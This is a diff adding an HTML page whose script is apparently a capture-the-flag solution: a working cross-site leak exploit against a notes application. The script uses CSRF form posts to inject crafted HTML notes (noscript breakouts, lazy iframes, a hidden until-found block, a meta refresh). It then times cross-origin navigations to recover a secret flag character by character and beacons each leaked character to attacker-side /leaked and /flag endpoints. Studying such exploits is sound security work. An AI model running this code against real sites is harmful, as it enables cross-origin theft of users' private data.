@@ -1,0 +1,98 @@
+<body>
+  <form id="createNote" action="..." method="post" target="csrf">
+    <input type="text" name="note" value="..." />
+  </form>
+  <script type="module">
+    const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
+    const KNOWN = new URLSearchParams(location.search).get("known");
+
+    const CHARS = "}abcdefghijklmnopqrstuvwxyz";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const wait = async (w) => {
+      while (true) {
+        try {
+          w.origin;
+        } catch {
+          return;
+        }
+        await sleep(5);
+      }
+    };
+
+    const prepare = async () => {
+      const win = open("about:blank", "csrf");
+
+      const createNote = async (note) => {
+        const form = document.getElementById("createNote");
+        form.action = `${BASE_URL}/create`;
+        form.note.value = note;
+        await sleep(100);
+        form.submit();
+        await sleep(100);
+      };
+
+      // https://xsleaks.dev/docs/attacks/id-attribute/
+      await createNote(`</noscript><div id="`);
+
+      // Create many <iframe> elements with `loading=lazy` and they will cause CSP errors
+      for (let i = 0; i < 20; i++) {
+        await createNote(
+          "</noscript>" +
+            "<iframe loading=lazy src=/ width=1></iframe>".repeat(10) +
+            "<noscript>"
+        );
+      }
+
+      // https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/hidden#using_until-found
+      await createNote(`<div hidden="until-found"><noscript>`);
+
+      // Timing attacks!
+      await createNote(
+        `<meta http-equiv="Refresh" content="1; URL=${location.origin}/end-time" />`
+      );
+
+      win.close();
+    };
+
+    const measure = async (query) => {
+      const url = `${BASE_URL}?${new URLSearchParams({ query })}`;
+      const hash = "</li>\n<li><span class=";
+
+      await fetch("/start-time");
+      const w = open(url);
+      await wait(w);
+      await sleep(100);
+      w.location = `${url}#${encodeURIComponent(hash)}`;
+      const { time } = await fetch("/get-time").then((r) => r.json());
+
+      w.close();
+      return time;
+    };
+
+    const main = async () => {
+      navigator.sendBeacon("/debug", "prepare: start");
+      await prepare();
+      navigator.sendBeacon("/debug", "prepare: end");
+      await sleep(1000);
+
+      let known = KNOWN;
+      while (!known.endsWith("}")) {
+        const threshold = (await measure(known + "@")) * 1.4;
+        navigator.sendBeacon("/debug", JSON.stringify({ threshold }));
+        for (const c of CHARS) {
+          const time = await measure(known + c);
+          navigator.sendBeacon("/debug", JSON.stringify({ c, time }));
+          if (time > threshold) {
+            known += c;
+            navigator.sendBeacon("/leaked", known);
+            break;
+          }
+        }
+      }
+      navigator.sendBeacon("/flag", known);
+    };
+    main();
+  </script>
+</body>
